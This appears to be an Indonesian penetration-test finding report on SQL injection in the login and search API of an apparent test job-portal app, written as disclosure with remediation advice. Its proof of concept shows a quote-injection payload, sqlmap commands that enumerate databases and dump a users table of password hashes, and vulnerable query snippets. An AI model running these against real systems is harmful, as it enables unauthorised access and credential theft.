# 🗃️ Finding: SQL Injection

> **Kerentanan:** SQL Injection — Pada parameter login dan search

---

## 1. Informasi Temuan

| Item | Detail |
|------|--------|
| **Severity** | 🔴 Critical |
| **Skor CVSS** | 9.3 |
| **Vektor CVSS** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| **CWE** | CWE-89 — Improper Neutralization of Special Elements used in an SQL Command |
| **OWASP** | A03:2021 – Injection |

---

## 2. Endpoint Terdampak

| Metode | Endpoint | Parameter |
|--------|----------|-----------|
| `POST` | `/api/auth/login` | `username`, `password` |
| `GET` | `/api/jobs/search?keyword=` | `keyword` |

---

## 3. Deskripsi

Kerentanan ini terjadi karena server **tidak melakukan sanitasi input** dan **tidak menggunakan parameterized queries** saat memproses kueri SQL. Akibatnya, penyerang bisa menyisipkan perintah SQL berbahaya untuk memanipulasi database.

---

## 4. Dampak

Eksploitasi kerentanan ini memungkinkan penyerang **tanpa otentikasi** untuk mengakses dan mengekstraksi **seluruh isi database** yang terhubung, termasuk:

| Dampak | Penjelasan |
|--------|------------|
| **Bypass Autentikasi** | Login sebagai user/admin mana pun tanpa password. |
| **Dump Database** | Ekstraksi seluruh tabel: users, credentials, data sensitif. |
| **Manipulasi Data** | Insert, update, atau delete data di database. |
| **Eskalasi ke RCE** | Pada konfigurasi tertentu, penyerang dapat menulis webshell atau menjalankan perintah OS via `--os-shell`. |

---

## 5. Langkah Proof of Concept (PoC)

### Langkah 1 — Deteksi Error SQL pada Form Login

Menyisipkan tanda kutip tunggal ( `'` ) pada field username di form login dan ditemukan **error database** yang mengkonfirmasi kerentanan SQL Injection.

**Request:**

```http
POST /api/auth/login HTTP/1.1
Host: jobportal.vulnapp.id
Content-Type: application/json

{
  "username": "'",
  "password": "test"
}
```

**Response — Error Database:**

```json
{
  "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1"
}
```

> 📸 **[screenshot: error database saat input tanda kutip di form login]**

---

### Langkah 2 — Pengujian dengan SQLMap

Menggunakan request login untuk melakukan pengujian otomatis menggunakan **SQLMap**.

**Simpan request ke file:**

```http
# simpan sebagai req.txt
POST /api/auth/login HTTP/1.1
Host: jobportal.vulnapp.id
Content-Type: application/json

{
  "username": "test*",
  "password": "test"
}
```

**Jalankan SQLMap:**

```bash
sqlmap -r req.txt --batch --dbs
```

**Output — SQLMap mendeteksi injectable parameter:**

```text
[INFO] the back-end DBMS is MySQL
[INFO] fetching database names
available databases [3]:
[*] information_schema
[*] jobportal_db
[*] mysql
```

> 📸 **[screenshot: output SQLMap mendeteksi parameter injectable dan menampilkan daftar database]**

---

### Langkah 3 — Berhasil Dump Daftar Database

SQLMap berhasil menampilkan **daftar database** aplikasi, mengkonfirmasi bahwa penyerang dapat mengakses seluruh data.

```bash
# Tampilkan tabel di database target
sqlmap -r req.txt --batch -D jobportal_db --tables
```

```text
Database: jobportal_db
[5 tables]
+---------------+
| users         |
| jobs          |
| applications  |
| companies     |
| sessions      |
+---------------+
```

```bash
# Dump tabel users
sqlmap -r req.txt --batch -D jobportal_db -T users --dump
```

```text
+----+----------+----------------------------------+-------+
| id | username | password                         | role  |
+----+----------+----------------------------------+-------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin |
| 2  | user1    | e10adc3949ba59abbe56e057f20f883e | user  |
| 3  | user2    | 827ccb0eea8a706c4c34a16891f84e7b | user  |
+----+----------+----------------------------------+-------+
```

> 📸 **[screenshot: output SQLMap berhasil dump tabel users beserta credential]**

---

## 6. Rekomendasi Perbaikan

| No | Rekomendasi | Detail |
|----|-------------|--------|
| 1 | **Prepared Statements** | Gunakan Parameterized Queries atau ORM pada **setiap** kueri database. Jangan pernah menyisipkan input user langsung ke string SQL. |
| 2 | **Sanitasi & Validasi Input** | Terapkan sanitasi dan validasi input di sisi server yang ketat — tolak karakter khusus SQL (`'`, `"`, `;`, `--`) pada field yang tidak memerlukannya. |
| 3 | **Least Privilege Database** | User database yang dipakai aplikasi hanya boleh `SELECT`, `INSERT`, `UPDATE` pada tabel yang dibutuhkan. Jangan gunakan user `root`. |
| 4 | **Error Handling** | Jangan tampilkan pesan error SQL/database ke user. Gunakan generic error message. |
| 5 | **WAF** | Tambahkan Web Application Firewall sebagai lapisan pertahanan tambahan untuk memfilter payload SQL Injection. |

### Contoh Kode — Prepared Statement (PHP)

```php
// ❌ RENTAN — string concatenation
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

// ✅ AMAN — prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

### Contoh Kode — Prepared Statement (Node.js / MySQL2)

```javascript
// ❌ RENTAN
db.query(`SELECT * FROM users WHERE username = '${username}'`);

// ✅ AMAN
db.query('SELECT * FROM users WHERE username = ?', [username]);
```

---

## 7. Referensi

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89 — SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CVSS 4.0 Calculator](https://www.first.org/cvss/calculator/4.0)
- [SQLMap Official](https://sqlmap.org/)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)